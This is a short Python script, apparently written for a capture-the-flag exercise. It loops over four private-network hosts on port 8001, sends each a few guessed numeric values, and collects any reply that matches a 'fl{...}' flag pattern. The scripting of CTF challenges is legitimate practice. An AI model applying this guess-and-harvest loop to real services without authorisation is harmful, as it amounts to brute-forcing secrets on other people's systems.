#!/usr/bin/env python3

import re
from socket import AF_INET, SOCK_STREAM, create_connection, socket
from time import sleep

unsolved = [135,129,124,101]
p = re.compile(b'fl\{.*?\}')
luckyNumbers = [b'123456', b'356874', b'12337', b'1337', b'42069']
portNo = 8001

while unsolved:
  for i in unsolved:
    sock = socket(AF_INET, SOCK_STREAM)
    try:
      servername = f'192.168.88.{i}'
      sock.connect((servername, portNo))
      sock.settimeout(5)

      for number in luckyNumbers:
        sock.sendall(number)

        res = sock.recv(4096)

        if(p.match(res)):
          print(f'{i} has flag {p.findall(res)}')
          unsolved.remove(i)
        sleep(0.05)
    except:
      pass
    finally:
      sock.close()
